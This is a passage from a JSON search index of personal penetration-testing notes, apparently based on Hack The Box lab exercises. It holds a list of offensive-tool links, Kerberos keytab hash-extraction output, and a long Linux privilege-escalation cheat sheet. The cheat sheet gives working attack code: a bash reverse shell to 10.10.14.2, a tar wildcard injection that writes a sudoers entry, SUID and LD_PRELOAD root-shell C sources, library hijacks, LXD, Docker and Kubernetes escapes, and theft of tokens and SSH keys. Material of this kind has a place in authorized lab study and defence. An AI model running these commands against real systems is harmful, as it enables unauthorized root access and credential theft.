https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1\nhttps://itm4n.github.io/printspoofer-abusing-impersonate-privileges/\nhttps://github.com/decoder-it/psgetsystem\nhttps://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC\nhttps://medium.com/@markmotig/enable-all-token-privileges-a7d21b1a4a77\nGenerate user wordlist :\njohn -wordlist:users.txt -rule:KoreLogic -stdout\rhttp://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html\nhttps://msrc.microsoft.com/update-guide/vulnerability\nhttps://cloud.binary.ninja/\nhttps://beeceptor.com/mock-api/\nhttps://blog.0daylabs.com/2016/04/03/unserialize-php-object-injection/\nhttps://github.com/zrax/pycdc\nhttps://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass\nhttps://beta.hackndo.com/\nhttps://7rocky.github.io/en/ctf/htb-challenges/pwn/\nhttps://github.com/jib1337/Rogue-MySQL-Server\nPrecompiled Binary : https://github.com/h4rithd/PrecompiledBinaries https://www.offsec.com/labs/\nhttps://github.com/Orange-Cyberdefense/GOAD\nhttps://pwn.college/\nhttps://www.thehacker.recipes/ad/\nhttps://evasions.checkpoint.com/about/\nhttps://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/\nhttps://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory\nhttps://www.youtube.com/watch?v=dShZR6FUV2w\nInQL : https://github.com/doyensec/inql\npwnfox: https://github.com/yeswehack/PwnFox\nhttps://github.com/spaze/hashes\nhttps://www.thc.org/segfault/\nhttps://nip.io/\ndns rebinding : https://lock.cmpxchg8b.com/rebinder.html\nhttps://csp-evaluator.withgoogle.com/\nCaido\nhttps://notes.secure77.de/?link=%2FOFFSEC%20Notes%2FWindows%20Related%2F_Windows%20Shells\nhttps://github.com/kevin-mizu/domloggerpp\nMelon loader\nhttps://www.soapui.org/downloads/soapui/\nhttps://regex101.com/\nhttps://www.techtarget.com/searchsecurity/feature/Ethical-hacking-How-to-conduct-a-Sticky-Keys-hack \u0026ldquo;https://www.techtarget.com/searchsecurity/feature/Ethical-hacking-How-to-conduct-a-Sticky-Keys-hack\nhttps://www.guidepointsecurity.com/blog/beyond-the-basics-exploring-uncommon-ntlm-relay-attack-techniques/\nhttps://portswigger.net/research/blind-css-exfiltration\nhttps://github.com/xairy/usb-hacking?tab=readme-ov-file#hardware\nhttps://github.com/RustScan/RustScan/releases/tag/2.3.0\nhttpmethods\nhttps://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1\nhttps://github.com/A-poc/RedTeam-Tools\nhttps://github.com/massgravel/Microsoft-Activation-Scripts\nhttps://gohugo.io/content-management/formats/\nhttps://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rdpbcgr/c2389e29-5706-4ac4-b555-e26f93144db7?redirectedfrom=MSDN\nhttps://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Microsoft/EN%20-%20Attacking%20RDP%20-%20Adrian%20Vollmer.pdf\nhttps://github.com/zigoo0/JSONBee\nhttps://arxiv.org/abs/2207.11171\nhttps://ide.kaitai.io/\n","date":"2023-09-07","id":67,"permalink":"/notes/ressources/link/","summary":"\u003cp\u003eCheat sheet AD :\nhttps://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg\u003c/p\u003e\n\u003cp\u003eCVE-Website:\nhttps://www.cvedetails.com/\u003c/p\u003e\n\u003cp\u003eCustom password :\nhttps://github.com/Mebus/cupp\u003c/p\u003e\n\u003cp\u003eCustom Username Wordlist :\nhttps://github.com/urbanadventurer/username-anarchy.git\u003c/p\u003e\n\u003cp\u003eCustom password :\nhttps://github.com/digininja/CeWL\u003c/p\u003e","tags":[],"title":"Link"},{"content":" Retrieve keystab : cat /etc/krb5.keytab | base64 python3 keytabextract.py file.keytab\rExtracting hash : python3 keytabextract.py krb5.keytab [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash. [*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction. [*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction. [+] Keytab File successfully imported. REALM : TENGU.VL SERVICE PRINCIPAL : NODERED$/ NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49 AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096 AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f\r","date":"2023-09-07","id":68,"permalink":"/notes/ad/linux/","summary":"\u003cul\u003e\n\u003cli\u003eRetrieve keystab :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/krb5.keytab \u003cspan class=\"p\"\u003e|\u003c/span\u003e base64\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epython3 keytabextract.py file.keytab\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eExtracting hash :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e python3 keytabextract.py krb5.keytab\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e*\u003cspan class=\"o\"\u003e]\u003c/span\u003e RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e*\u003cspan class=\"o\"\u003e]\u003c/span\u003e AES256-CTS-HMAC-SHA1 key found. Will attempt \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e extraction.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e*\u003cspan class=\"o\"\u003e]\u003c/span\u003e AES128-CTS-HMAC-SHA1 \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e discovered. Will attempt \u003cspan class=\"nb\"\u003ehash\u003c/span\u003e extraction.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e+\u003cspan class=\"o\"\u003e]\u003c/span\u003e Keytab File successfully imported.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        REALM : TENGU.VL\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        SERVICE PRINCIPAL : NODERED$/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        NTLM HASH : d4210ee2db0c03aa3611c9ef8a4dbf49\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e","tags":[],"title":"Linux"},{"content":"Information Gathering Environment Enumeration #Environment_Enumeration\nDetermine the operating system and version : cat /etc/os-release\rDisplay the system\u0026rsquo;s PATH variable: echo $PATH\rShow the environment variables: env\rDisplay detailed system information: uname -a\rGather information about the CPU type/version: lscpu\rIdentify available login shells : cat /etc/shells bash --version\rEnumerate block devices : lsblk\rCheck for credentials in /etc/fstab : cat /etc/fstab | grep -E \u0026#39;password|username|credential\u0026#39;\rGrab a hash from id_rsa : ssh2john id_rsa \u0026gt; ssh.hash john --wordlist=/usr/share/wordlist/rockyou.txt ssh.hash\rDisplay the routing table to view available networks and interfaces: netstat -rn\rCheck for domain environments and internal DNS configuration: cat /etc/resolv.conf\rEnumerate users from /etc/passwd: cat /etc/passwd | cut -f1 -d:\rDisplay information about groups on the system: cat /etc/group\rList members of interesting groups, e.g., \u0026lsquo;sudo\u0026rsquo;: getent group sudo\rDisplay information about mounted file systems: df -h\rDisplay details of unmounted file systems from /etc/fstab: cat /etc/fstab | grep -v \u0026#34;#\u0026#34; | column -t\rList all hidden files : find / -type f -name \u0026#34;.*\u0026#34; -exec ls -l {} \\; 2\u0026gt;/dev/null | grep htb-student\rList all hidden directories : find / -type d -name \u0026#34;.*\u0026#34; -ls 2\u0026gt;/dev/null\rDisplay information about temporary files and directories: ls -l /tmp /var/tmp /dev/shm\rLinux Services \u0026amp; Internals Enumeration #Linux_Services_Internals_Enumeration\nLast login on the machine: lastlog Find some credentials : history\rFind history file : find / -type f \\( -name *_hist -o -name *_history \\) -exec ls -l {} \\; 2\u0026gt;/dev/null\rProc : find /proc -name cmdline -exec cat {} \\; 2\u0026gt;/dev/null | tr \u0026#34; \u0026#34; \u0026#34;\\n\u0026#34;\rSee installed services : apt list --installed | tr \u0026#34;/\u0026#34; \u0026#34; \u0026#34; | cut -d\u0026#34; \u0026#34; -f1,3 | sed \u0026#39;s/[0-9]://g\u0026#39; | tee -a installed_pkgs.list\rCompare existing binaries with the ones from GTFObins: for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d\u0026#34; \u0026#34; -f1 | sed \u0026#39;/^[[:space:]]*$/d\u0026#39;);do if grep -q \u0026#34;$i\u0026#34; installed_pkgs.list;then echo \u0026#34;Check GTFO for: $i\u0026#34;;fi;done\rFind configuration file on the machine : find / -type f \\( -name *.conf -o -name *.config \\) -exec ls -l {} \\; 2\u0026gt;/dev/null #or find / ! -path \u0026#34;*/proc/*\u0026#34; -iname \u0026#34;*config*\u0026#34; -type f 2\u0026gt;/dev/null\rEnumerate sh file: find / -type f -name \u0026#34;*.sh\u0026#34; #or sudo find / -type f -name \u0026#34;*.sh\u0026#34; -user www-data -readable #or find / -type f -name \u0026#34;*.sh\u0026#34; 2\u0026gt;/dev/null | grep -v \u0026#34;src\\|snap\\|share\u0026#34;\rstrace on Linux-based : strace ping -c1 10.129.112.20\rProcess running : ps aux | grep root\rCredential Hunting #Linux_Credential\nWordpress Credential : cat wp-config.php | grep \u0026#39;DB_USER\\|DB_PASSWORD\u0026#39;\rWebsite Credential : grep -ir \u0026#34;DB_USER\\|DB_PASSWORD\u0026#34; /var/www/html\rEnvironment-based Privilege Escalation #Path_Abuse\nPath Abuse: PATH =.:${PATH} export PATH echo $PATH #then touch ls echo \u0026#39;echo \u0026#34;PATH ABUSE!!\u0026#34;\u0026#39; \u0026gt; ls chmod +x ls\rExemple of another Path Abuse : https://medium.com/purplebox/linux-privilege-escalation-with-path-variable-suid-bit-6b9c492411de Wildcard Abuse #Wildcard_Abuse\nExample of wildcard abuse : echo \u0026#39;echo \u0026#34;htb-student ALL=(root) NOPASSWD: ALL\u0026#34; \u0026gt;\u0026gt; /etc/sudoers\u0026#39; \u0026gt; root.sh echo \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=sh root.sh\u0026#34; echo \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\rOutput: htb-student@NIX02:~$ ls -la total 56 drwxrwxrwt 10 root root 4096 Aug 31 23:12 . drwxr-xr-x 24 root root 4096 Aug 31 02:24 .. -rw-r--r-- 1 root root 378 Aug 31 23:12 backup.tar.gz -rw-rw-r-- 1 htb-student htb-student 1 Aug 31 23:11 --checkpoint=1 -rw-rw-r-- 1 htb-student htb-student 1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh drwxrwxrwt 2 root root 4096 Aug 31 22:36 .font-unix drwxrwxrwt 2 root root 4096 Aug 31 22:36 .ICE-unix -rw-rw-r-- 1 htb-student htb-student 60 Aug 31 23:11 root.sh\rRestricted shell resource : https://0xffsec.com/handbook/shells/restricted-shells/ Permissions-based Privilege Escalation Special Permissions #setgid_setuid\nFind Root setgid and setuid : find / -user root -perm -4000 -exec ls -ldb {} \\; 2\u0026gt;/dev/null #and find / -uid 0 -perm -6000 -type f 2\u0026gt;/dev/null\rRessources : https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits LXC / LXD Exploitation #LXC_LXD\nGroup Membership:\nUser devops is a member of groups devops and lxd. Command: id\rOutput: uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd) Unzipping Alpine Image:\nCommand: unzip alpine.zip\rOutput: Archive extraction details. LXD Initialization:\nCommand:\nlxd init\rPrompts:\nConfigure new storage pool? (yes) Storage backend (dir) LXD over the network? (no) Configure LXD bridge? (yes) Error: /usr/sbin/dpkg-reconfigure must be run as root.\nImport Local Image:\nCommand: lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine\rOutput: Image imported with fingerprint be1ed370b16f6f3d63946d47eb57f8e04c77248c23f47a41831b5afff48f8d1b Start Privileged Container:\nCommand: lxc init alpine r00t -c security.privileged=true\rOutput: Container r00t created. Mount Host File System:\nCommand: lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true\rOutput: Device mydev added to r00t. Spawn Shell Inside Container:\nCommands: lxc start r00t\rlxc exec r00t /bin/sh\rOutput: Access inside the container with root privileges. Docker Group Exploitation: Members in the docker group have root-level access. Example Docker command: docker run -v /root:/mnt -it ubuntu\rDisk Group Access:\nUsers in the disk group have full access to devices in /dev, like /dev/sda1. Example: Use debugfs to access the entire file system with root privileges. ADM Group Access:\nMembers in the adm group can read all logs in /var/log. User secaudit is a member of groups secaudit and adm. Capabilities #Capabilities\nEnumerate Capabilities : find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \\;\rExploiting Capabilities: getcap /usr/bin/vim.basic\rWe can use the cap_dac_override capability of the /usr/bin/vim binary to modify a system file: /usr/bin/vim.basic /etc/passwd\rWe also can make these changes in a non-interactive mode: echo -e \u0026#39;:%s/^root:[^:]*:/root::/\\nwq\u0026#39; | /usr/bin/vim.basic -es /etc/passwd cat /etc/passwd | head -n1 root::0:0:root:/root:/bin/bash\rService-based Privilege Escalation Writable files or directories: find / -path /proc -prune -o -type f -perm -o+w 2\u0026gt;/dev/null\rDownload pspy : wget https://github.com/DominicBreuker/pspy\rRun pspy : #print both commands and file system events and scan procfs every 1000 ms (=1sec) ./pspy64 -pf -i 1000\r**LXD ** #LXD2\nStep 1: lxc image import ubuntu-template.tar.xz --alias ubuntutemp lxc image list\rStep 2 : lxc init ubuntutemp privesc -c security.privileged=true lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\rGet a root shell : lxc start privesc lxc exec privesc /bin/bash # or sh for the command Docker #Docker\nCreate our own docker : wget https://master.dockerproject.org/linux/x86_64/docker chmod +x docker docker -H unix:///app/docker.sock ps\rdocker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app docker -H unix:///app/docker.sock ps docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash cat /hostsystem/root/.ssh/id_rsa\rOther way to privesc when the socket is writable : docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash\r\u0026ndash;privileged flag The \u0026ndash;privileged flag allows the container to have access to the host devices.\nWell configured docker containers won\u0026rsquo;t allow command like fdisk -l. However on miss-configured docker command where the flag \u0026ndash;privileged is specified, it is possible to get the privileges to see the host drive.\nSo to take over the host machine, it is trivial:\nmkdir -p /mnt/hola mount /dev/sda1 /mnt/hola\rNeed to be root to be able to mount . Bonus: If you want to know the container id it\u0026rsquo;s located in /etc/hostname of the docker container Kubernetes #Kubernetes\nExtracting Pods with anonymous access: curl https://10.129.10.11:10250/pods -k | jq . #or kubeletctl -i --server 10.129.10.11 pods\rAvailable command : kubeletctl -i --server 10.129.10.11 scan rce #then get a root access kubeletctl -i --server 10.129.10.11 exec \u0026#34;id\u0026#34; -p nginx -c nginx\rExtracting Tokens : kubeletctl -i --server 10.129.10.11 exec \u0026#34;cat /var/run/secrets/kubernetes.io/serviceaccount/token\u0026#34; -p nginx -c nginx | tee -a k8.token\rExtracting Certificate : kubeletctl --server 10.129.10.11 exec \u0026#34;cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt\u0026#34; -p nginx -c nginx | tee -a ca.crt\rList Privileges export token=`cat k8.token` kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list #output Resources\tNon-Resource URLs\tResource Names\tVerbs selfsubjectaccessreviews.authorization.k8s.io\t[]\t[]\t[create] selfsubjectrulesreviews.authorization.k8s.io\t[]\t[]\t[create] pods\t[]\t[]\t[get create list]\rCreate our own YAML pod : apiVersion: v1 kind: Pod metadata: name: privesc namespace: default spec: containers: - name: privesc image: nginx:1.14.2 volumeMounts: - mountPath: /root name: mount-root-into-mnt volumes: - name: mount-root-into-mnt hostPath: path: / automountServiceAccountToken: true hostNetwork: true\rCreation new pod : kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods #output NAME\tREADY\tSTATUS\tRESTARTS\tAGE nginx\t1/1\tRunning\t0\t23m privesc\t1/1\tRunning\t0\t12s\rExtracting root ssh or make a reverse shell : kubeletctl --server 10.129.10.11 exec \u0026#34;cat /root/root/.ssh/id_rsa\u0026#34; -p privesc -c privesc\rLogrotate #Logrotate\nDownload logrotten : git clone https://github.com/whotwagner/logrotten.git cd logrotten gcc logrotten.c -o logrotten echo \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.2/9001 0\u0026gt;\u0026amp;1\u0026#39; \u0026gt; payload\rIn our case, it is the option: create. Therefore we have to use the exploit adapted to this function: grep \u0026#34;create\\|compress\u0026#34; /etc/logrotate.conf | grep -v \u0026#34;#\u0026#34;\rExploit: ./logrotten -p ./payload /tmp/tmp.log\rWeak NFS Privileges :\nshowmount -e 10.129.2.12 cat /etc/exports #no_root_squash\rshell bit SUID : #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main(void) { setuid(0); setgid(0); system(\u0026#34;/bin/bash\u0026#34;); }\rsudo mount -t nfs 10.129.2.12:/tmp /mnt cp shell /mnt chmod u+s /mnt/shell\rHijacking Tmux : tmux -S /shareds new -s debugsess chown root:devs /shareds tmux -S /shareds\rLinux Internals-based Privilege Escalation LD_PRELOAD #LD_PRELOAD\nExploit: #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; void _init() { unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); setgid(0); setuid(0); system(\u0026#34;/bin/bash\u0026#34;); }\rCompile : gcc -fPIC -shared -o root.so root.c -nostartfiles\rRun: sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart #Apache no password root\rShared Object Hijacking #Shared_Object_Hijacking\nreadelf -d payroll | grep PATH #payroll file with bit Suid\rCustom LIb : cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so ldd payroll\rExploit : #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; void dbquery() { printf(\u0026#34;Malicious library loaded\\n\u0026#34;); setuid(0); system(\u0026#34;/bin/sh -p\u0026#34;); } Compile: gcc src.c -fPIC -shared -o /development/libshared.so\rPython Library Hijacking #Python_Hijacking\npip3 show psutil #misconfigure lib psutil\rExploit: #!/usr/bin/env python3 import os def virtual_memory(): os.system(\u0026#39;id\u0026#39;)\rPYTHONPATH Environment Variable\nIn the previous section, we touched upon the term PYTHONPATH, however, didn\u0026rsquo;t fully explain it\u0026rsquo;s use and importance regarding the functionality of Python. PYTHONPATH is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python\u0026rsquo;s search functionality to a user-defined location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our sudo permissions:\nChecking sudo permissions sudo -l Matching Defaults entries for htb-student on ACADEMY-LPENIX: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User htb-student may run the following commands on ACADEMY-LPENIX: (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3\rAs we can see from the example, we are allowed to run /usr/bin/python3 under the trusted permissions of sudo and are therefore allowed to set environment variables for use with this binary by the SETENV: flag being set. It is important to note, that due to the trusted nature of sudo, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the /usr/bin/python3 binary, we can effectively set any environment variables under the context of our running program. Let\u0026rsquo;s try to do so now using the psutil.py script from the last section.\nPrivilege Escalation using PYTHONPATH Environment Variable s=/tmp/ /usr/bin/python3 ./mem_status.py uid=0(root) gid=0(root) groups=0(root) ...SNIP...\rIn this example, we moved the previous python script from the /usr/lib/python3.8 directory to /tmp. From here we once again call /usr/bin/python3 to run mem_stats.py, however, we specify that the PYTHONPATH variable contain the /tmp directory so that it forces Python to search that directory looking for the psutil module to import. As we can see, we once again have successfully run our script under the context of root.\nOther way to privesc: grep -r \u0026#34;def virtual_memory\u0026#34; /usr/local/lib/python3.8/dist-packages/psutil/*\rResources Tools : https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ","date":"2023-09-07","id":69,"permalink":"/notes/ad/local-privilege-escalation/linux-privesc/","summary":"\u003ch3 id=\"information-gathering\"\u003eInformation Gathering\u003c/h3\u003e\n\u003ch4 id=\"environment-enumeration\"\u003eEnvironment Enumeration\u003c/h4\u003e\n\u003cp\u003e#Environment_Enumeration\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eDetermine the operating system and version :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/os-release\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay the system\u0026rsquo;s PATH variable:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eecho\u003c/span\u003e \u003cspan class=\"nv\"\u003e$PATH\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eShow the environment variables:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eenv\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eDisplay detailed system information:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003euname -a\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eGather information about the CPU type/version:\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elscpu\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eIdentify available login shells :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/shells\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebash --version\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eEnumerate block devices :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elsblk\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCheck for credentials in /etc/fstab :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/fstab \u003cspan 